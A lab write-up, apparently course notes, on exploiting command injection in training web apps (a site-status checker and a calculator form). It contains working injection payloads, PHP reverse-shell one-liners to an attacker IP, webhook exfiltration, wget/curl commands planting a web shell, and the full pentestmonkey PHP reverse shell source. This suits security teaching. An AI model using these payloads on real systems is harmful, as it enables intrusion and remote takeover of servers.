# ♻️ Command injections

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

### Command injections

Command injection is a security vulnerability that occurs when an attacker is able to inject arbitrary commands into a command or script that is subsequently executed by a system or application. This type of attack can lead to unauthorized execution of system commands, potentially allowing the attacker to manipulate the system, access sensitive data, or perform malicious actions. Command injection vulnerabilities are commonly found in web applications, especially those that interact with external systems or execute commands on the underlying operating system.

### Basics <a href="#lecture_heading" id="lecture_heading"></a>

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

We have this website that gives us the status of a website we input, and we can see the command the server runs in background  so it is not blind, we can easily bypass the security:

to make the backend run a &#x20;

```
Command: curl -I -s -L https://tcm-sec.com; whoami;echo HTTP/ | grep "HTTP/" 
```

we need to input

```
https://tcm-sec.com; whoami;echo HTTP/
```

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

Now our goal is going to want to make the cleanest output possible:

we also want the grep command to fail:&#x20;

```
; whoami; asd
```

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption><p>pretty clean in my opinion</p></figcaption></figure>

now we can have a clean output of any command we want:&#x20;

<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

if it's not well formatted, you can view source code at any time to have good indentation:&#x20;

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

in a ctf mentality we could try to&#x20;

```
; cat /etc/passwd; asd
```

<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

Now let's try to get a shell:

{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools" %}

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

I tried all the reverse shells, but it did not work for me, let's try to find other interesting reverse shells:

```
; which php; asd
```

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

So there is PHP on this host, we could've tried with python or other stuff, but the webpage is a .php so it was easy hit

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

```
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp  9897
listening on [any] 9897 ...
```

remember to open a listener on your machine ->

```
; php -r '$sock=fsockopen("172.16.X.X",9897);exec("/bin/sh -i <&3 >&3 2>&3");'; asd
```

<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

We gained a successful shell!

### Blind / Out-of-Band <a href="#lecture_heading" id="lecture_heading"></a>

Now we go on another machine, let's test out what we can do and what it gives us back

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

it's not as verbose as the last website, we only get OK if the request is a success, no details

So a good way of starting would be to test out what already worked for us, since the syntax must be similar :

```
https://tcm-sec.com; whoami; asd
```

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

So it filters our input in some way that makes the semicolons disappear

let's try webhook command injection

<pre><code><strong>https://webhook.site/3b654785-96d1-X.X.X.X.X?`whoami`
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

we captured the request, and it prints out the useful information we need

let's try to play with what we have to get more useful information:

let's host a python server:

```
┌──(root㉿kali)-[/home/kali]
└─# python -m http.server 9898
Serving HTTP on 0.0.0.0 port 9898 (http://0.0.0.0:9898/) ...
```

```
https://tcm-sec.com \n wget 172.16.X.X:9898/test
```

```
┌──(root㉿kali)-[/home/kali]
└─# python -m http.server 9898
Serving HTTP on 0.0.0.0 port 9898 (http://0.0.0.0:9898/) ...
172.18.X.X - - [31/Jan/2024 11:03:15] code 404, message File not found
172.18.X.X - - [31/Jan/2024 11:03:15] "HEAD /test HTTP/1.1" 404 -
```

we successfully did a request to our local server, from there it's going to be a smooth ride ->

download a reverse shell from pentestmonkey:

```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

put your ip and your port, and then input a wget command to go and upload your file on the server ->

```
https://tcm-sec.com \n wget 172.16.X.X:9898/reverse.php
```

just to be sure it went through, we can look at our listener:                                                                                                                &#x20;

<pre><code><strong>┌──(root㉿kali)-[/home/kali]
</strong>└─# python -m http.server 9898
Serving HTTP on 0.0.0.0 port 9898 (http://0.0.0.0:9898/) ...
172.X.X.X - - [31/Jan/2024 11:03:15] code 404, message File not found
172.X.X.X - - [31/Jan/2024 11:03:15] "HEAD /test HTTP/1.1" 404 -
172.X.X.X - - [31/Jan/2024 12:27:14] "HEAD /reverse.php HTTP/1.1" 200 -
</code></pre>

we see a status 200 on our reverse.php file that we modified with our ip and port

(there were some modifications on the server while writing the write-up, new payload is:)&#x20;

```
https://tcm-sec.com && curl 172.16.X.X:9898/reverse.php > /var/www/html/reverse.php
```

we set up a listener with a&#x20;

```
nc -nvlp 4444
```

and if the new payload is successful on our HTTP server with a code 200, we go and check the webpage where it stored our file → localhost/reverse.php

and if everything is well done on our netcat listener, we get a&#x20;

```
┌──(root㉿kali)-[/home/kali]
└─# nc -nlvp 4444    
listening on [any] 4444 ...
connect to [172.16.X.X] from (UNKNOWN) [172.18.X.X] 56136
Linux e4ce52282ed6 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux
 18:50:53 up  9:32,  0 users,  load average: 0.76, 0.63, 0.55
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

we successfully popped a shell on the server :tada:

### Exam lab

<figure><img src="../../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

our exam lab is a position calculator that takes 2 inputs. Thankfully we got a verbose website and see what the server does and the result. Let's hack

interesting fact is that we can input strings in input boxes, and it goes into the equation:

```
Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-test)^2))}'
Result: 123 
```

What we would want is to execute our command and comment out the rest of the equation without making everything explode. Something theoretical like that:

<pre><code><strong>Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-456)^2))}'
</strong>					      ((-456)^2))}';whoami;#
</code></pre>

<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption><p>1st step done, let's go deeper</p></figcaption></figure>

To pop a shell we need to create a request coming from the server to our local listener

we see the file is a .php so we can go and use the php reverse shell payload from earlier and modify it:

```
Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-456)^2))}'
					      ((-456)^2))}'; php -r '$sock=fsockopen("172.16.X.X",8080);exec("/bin/sh -i <&3 >&3 2>&3");'; asd;#
```

<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption><p>the input looks like this </p></figcaption></figure>

```
                                                                                                                  
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 8080
listening on [any] 8080 ...
connect to [172.16.X.X] from (UNKNOWN) [172.18.X;X] 47746
/bin/sh: 0: can't access tty; job control turned off
$
```

We got a shell on the machine :smile:
